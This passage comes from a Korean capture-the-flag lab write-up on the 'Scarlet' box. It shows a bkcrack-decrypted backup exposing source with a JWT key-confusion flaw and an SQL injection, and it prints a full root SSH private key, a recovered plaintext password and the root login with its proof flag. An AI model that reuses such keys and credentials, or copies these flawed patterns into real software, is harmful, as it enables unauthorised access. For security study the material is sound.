   creating: out/web/routes/
  inflating: out/web/routes/index.js
   creating: out/web/helpers/
  inflating: out/web/helpers/JWTHelper.js
  inflating: out/web/helpers/DBHelper.js
  inflating: out/web/database.db
```

**53/53 — 전 엔트리 복호화 성공.** 딸려 나온 소스가 앞 절의 취약점을 확정함(`~/git/bkcrack/build/src/cli/out/web/`).

```js
// helpers/JWTHelper.js
const publicKey  = fs.readFileSync('./public.key', 'utf8');
async decode(token) {
    return (await jwt.verify(token, publicKey, { algorithms: ['RS256', 'HS256'] }));
}
```

```js
// helpers/DBHelper.js — getUser 만 템플릿 리터럴, 나머지 셋은 플레이스홀더
getUser(username){ db.get(`SELECT * FROM users WHERE username = '${username}'`, ...) }
checkUser(username){ db.get(`SELECT * FROM users WHERE username = ?`, username, ...) }
attemptLogin(username, password){ db.get(`SELECT * FROM users WHERE username = ? AND password = ?`, ...) }
```

세 가지가 확정됨.

- **키 혼동의 원인은 「알고리즘 미지정」이 아니라 「화이트리스트에 HS256 을 같이 넣은 것」이다.** `algorithms` 를 명시했는데도 대칭 알고리즘이 목록에 있어 `publicKey` PEM 문자열이 HMAC 비밀키로 재해석됨. 의존성은 `jsonwebtoken ^8.5.1`(`package.json`)
- `routes/index.js` 의 로그인 분기는 발급 «전»에 `username.replace(/'/g, "''")` 로 따옴표를 이스케이프한다. **위조 토큰은 그 경로를 통째로 건너뛰므로 방어가 되지 못한다** — 「미들웨어를 통과했으니 안전한 값」이라는 전제가 정확히 여기서 무너짐
- `index.js` 는 `bodyParser.urlencoded({extended:false})` 만 등록하고 `bodyParser.json()` 이 없다. **JSON 로그인 시도가 실패한 원인이 이것으로 확정된다** — 본문이 파싱되지 않아 `req.body.username` 이 `undefined` 가 되므로 자격증명이 맞아도 실패함

```bash
┌──(kali㉿kali)-[~/…/bkcrack/build/src/cli]
└─$ cat out/ssh-keys/id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
```

**키를 쓰기 전에 「누구 키인가」부터 확인할 것.** 마지막 줄 근처의 `AAAAMcm9vdEBzY2FybGV0` 는 base64 로 `root@scarlet` — OpenSSH 개인키 형식은 끝부분에 코멘트를 평문 base64 로 담음. `ssh-keygen -l -f id_rsa` 로 지문과 코멘트를 한 번에 보고, `ssh-keygen -y -f id_rsa` 로 대응 공개키를 산출해 `authorized_keys` 와 대조 가능. 다만 코멘트는 관례일 뿐 보증이 아니므로 안 맞으면 `/etc/passwd` 의 사용자를 순회할 것.

```bash
┌──(kali㉿kali)-[~/PG/Scarlet]
└─$ vi keykey

┌──(kali㉿kali)-[~/PG/Scarlet]
└─$ chmod 600 keykey

┌──(kali㉿kali)-[~/PG/Scarlet]
└─$ ssh -i keykey root@192.168.248.222
Welcome to Ubuntu 22.04 LTS (GNU/Linux 5.15.0-41-generic x86_64)
 ... (MOTD 중략) ...
  System information as of Wed Aug 19 07:34:18 AM UTC 2026

  System load:  0.0               Processes:               237
  Usage of /:   59.4% of 9.75GB   Users logged in:         1
  Memory usage: 38%               IPv4 address for ens160: 192.168.248.222
  Swap usage:   0%
 ... (중략) ...
*** System restart required ***
Last login: Fri Aug 26 02:36:00 2022
root@scarlet:~# ls
proof.txt  snap
root@scarlet:~# cat proof.txt
07e450d973658eaa9fe028265ba6b784
```

`chmod 600` 을 먼저 친 순서라 권한 경고는 발생하지 않았음 — **이 박스에서 `UNPROTECTED PRIVATE KEY FILE` 배너를 겪은 것은 아니다.** 개인키 파일을 만든 직후 `chmod 600` 을 치는 반사만 유지할 것. 부수 함정 둘 — 파일이 root 소유면 일반 사용자로는 권한이 맞아도 못 읽으므로 `chown $USER:$USER`, 그리고 에디터가 붙인 CRLF·트레일링 공백은 키를 깨뜨리므로 `file` 로 확인하고 `dos2unix` 를 돌릴 것.

### Post-Exploitation

**Proof.txt value:**
`07e450d973658eaa9fe028265ba6b784`

⚠️ `local.txt`·`proof.txt` 모두 **대화형 SSH 세션에서 원위치 `cat`** 으로 읽었고 그 세션 캡처가 이 절과 앞 절의 블록임. 다만 `whoami; id; hostname; hostname -I; date; cat <플래그>` 를 한 화면에 묶은 `proof_user.txt`·`proof_root.txt` 는 만들지 않았고 스크린샷도 0장이다 — 이 박스는 정지돼 있어 되살릴 방법이 없다.

**획득 자격증명**

| 계정 | 값 | 출처 |
|---|---|---|
| `4leaf` | `password1` | `[가정]` 자가 등록(회원가입 폼) — 원문에 기록 없음 |
| `brian` | `Standingbytheseaside12` | SQLi 로 `users` 테이블 덤프 |
| `root` (SSH 키) | `out/ssh-keys/id_rsa`(코멘트 `root@scarlet`) | `/opt/backup.zip` bkcrack 복호화 |
| JWT 서명 개인키 | `out/web/private.key` | 동일 — **미사용** |

**남긴 흔적**

- 타겟 측 `/tmp/bk/`(backup.zip 작업 디렉터리) · root SSH 로그인 기록(`wtmp`/`auth.log`) — 랩 Stop 으로 소멸. 계정 생성·설정 변경 없음
- 위조 JWT 세션 — `Max-Age` 900초로 자동 만료
- **Kali `/tmp/nfs` NFS 마운트 — 해제 확인함.** `grep nfs /proc/mounts` 가 빈 결과(2026-08-26 확인). ⚠️ 이 마운트를 방치한 탓에 이후 세 박스의 감사 작업이 죽은 `hard` 마운트에 걸려 전부 블록된 사고가 있었다([[_PLAYBOOK#A-42. `find` / `ls` 가 영영 안 끝난다]])
- **Kali `/etc/hosts` 의 `192.168.248.222 scarlet.local` — 제거 확인함**(2026-08-26)
- Kali 잔존 산출물 — `~/PG/Scarlet/`(`backup.zip`·`zip.hash`·`keykey`·`ex/`·`ex_test/`·`scarlet_all.sh`·`nmap.log`) · `~/git/bkcrack/build/src/cli/`(`pub.deflate`·`decrypted.zip`·`out/`). `zip.hash` 와 `ex`·`ex_test` 는 **실패한 시도의 증거이므로 지우지 않는다**
- 리버스셸을 쓰지 않아 Kali 리스너·tmux 세션 없음(전 구간 SSH·HTTP)

**밟지 않은 길 · 사후 확인**

- `web/assets/images/hashes.json` — 침투 당시 열어본 기록이 없어 「이름부터 수상하다」로 남겨 두었으나, **사후 확인 결과 Mobirise 가 생성한 이미지 파일명↔해시 맵**(`{"yflhvMFJ//Gncc19l8RWng==":"mbr-1.jpg", ...}` 43개)이고 자격증명·경로 힌트는 없음
- `web/private.key` — 확보했으나 쓰지 않음. 키 혼동이 이미 성립해 필요가 없었음
- `/home/brian/web/database.db` — SQLi 로 덤프했으나 셸에서 직접 열지 않았음. 백업 안의 2022년판을 사후에 열어보니 `users` 는 `brian` 1행뿐이고 `sqlite_sequence` 는 9

## 관련

- [[Hawat]] — 백업 아카이브에서 소스·키를 확보해 체인을 여는 동일 패턴. 다만 Hawat 은 웹서버가 root 라 권한상승이 없었고, Scarlet 은 웹앱이 `brian` 으로 돌아 별도 경로가 필요했음
- [[Robust]] — 평문 저장 자격증명이 그대로 OS 로그인으로 이어지는 같은 구조
- RFC 8725 — JSON Web Token Best Current Practices §3.1 "Perform Algorithm Verification": <https://www.rfc-editor.org/rfc/rfc8725>
- Auth0, "Critical vulnerabilities in JSON Web Token libraries"(2015): <https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/>
- jwt_tool: <https://github.com/ticarpi/jwt_tool> · PortSwigger Web Security Academy — JWT attacks: <https://portswigger.net/web-security/jwt>
- bkcrack: <https://github.com/kimci86/bkcrack> — `tools/deflate.py` 가 평문 전처리용. 이론 근거는 Biham & Kocher, "A Known Plaintext Attack on the PKZIP Stream Cipher"(FSE 1994)
- SQLite 스키마 카탈로그 `sqlite_master`: <https://www.sqlite.org/schematab.html> · NFS `exports(5)` — `root_squash`/`no_root_squash`/`anonuid`: `man 5 exports`
- CVE 없음 — 전부 커스텀 애플리케이션의 설정·구현 결함(OWASP A01 Broken Access Control · A02 Cryptographic Failures · A03 Injection)
- [[_PLAYBOOK#A-16. 워드리스트 열거가 전부 공전한다]] · [[_PLAYBOOK#A-2-17. SQLi 는 찾았는데 데이터가 안 나온다]] · [[_PLAYBOOK#A-42. `find` / `ls` 가 영영 안 끝난다]]
- [[_PLAYBOOK#B-12. SQLi 수동 UNION — sqlmap 금지 대비]] · [[_PLAYBOOK#B-61. 개인키의 주석은 소유자가 아니다]] · [[_PLAYBOOK#B-6-12. 평문 비밀번호를 하나 주우면 「이 조직이 쓰는 비밀번호」로 취급한다]] · [[_PLAYBOOK#B-1-40. 관리 화면이 렌더한 «경로»가 실행 계정을 말해준다 — 권한상승 유무를 익스플로잇 전에 안다]]
